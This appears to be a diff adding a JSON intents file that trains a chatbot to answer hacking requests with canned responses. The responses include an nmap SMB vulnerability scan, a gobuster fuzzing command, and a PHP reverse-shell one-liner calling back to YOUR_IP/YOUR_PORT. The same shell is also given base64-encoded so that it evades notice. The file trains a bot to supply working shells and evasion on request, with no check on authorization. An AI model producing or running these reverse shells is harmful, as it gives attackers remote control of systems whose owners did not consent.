@@ -1,0 +1,29 @@
+{
+    "intents": [{
+            "tag": "scanning",
+            "patterns": ["scan for smb vulnerabilities","start a scan using nmap","scan for smb vulnerability using nmap"],
+            "responses": ["Of course to scan for smb vulnerabilities using a simple nmap scan you can use the following code 'nmap -p445 --script smb-vuln* <target>' and for a full scan 'nmap -p445 -A --script smb-vuln* <target>' "],
+            "context": [""]
+        },
+        {
+            "tag": "reverse-shell",
+            "patterns": ["give a php shell one liner","generate a reverse shell one liner"],
+            "responses": ["alright a reverse shell is basically a shell oin which the target system communicates back with the host computer . The basic one liner reverse shell is as follows: 'php -r '$sock=fsockopen('YOUR_IP',YOUR_PORT);exec('/bin/sh -i <&3 >&3 2>&3');''"],
+            "context": [""]
+        },
+        {
+            "tag": "encoded-shell",
+            "patterns": ["give me a encoded form of reverse shell one liner","encode my reverse shell"],
+            "responses": ["sure here is the encoded version of the reverse shell : 'php -r 'eval(base64_decode('JHNvY2s9ZnNvY2tvcGVuKCJZT1VSX0lQIiwiWU9VUl9QT1JUIik7ZXhlYygiL2Jpbi9zaCAtaSA8JjMgPiYzIDI+JjMiKTs='));'' "],
+            "context": [""]
+        },
+        {
+            "tag": "fuzzing",
+            "patterns": ["fuzz an .xml file for me","how to fuzz a .xml file"],
+            "responses": ["To fuzz an .xml file using gobuster, you can use the -x flag for file extensions and the -w flag to specify a wordlist. Here's an example command: 'gobuster dir -u http://example.com/path/to/file.xml -w /path/to/wordlist.txt -x xml -o fuzz_results.txt'"],
+            "context": [""]
+        }
+        
+
+    ]
+}
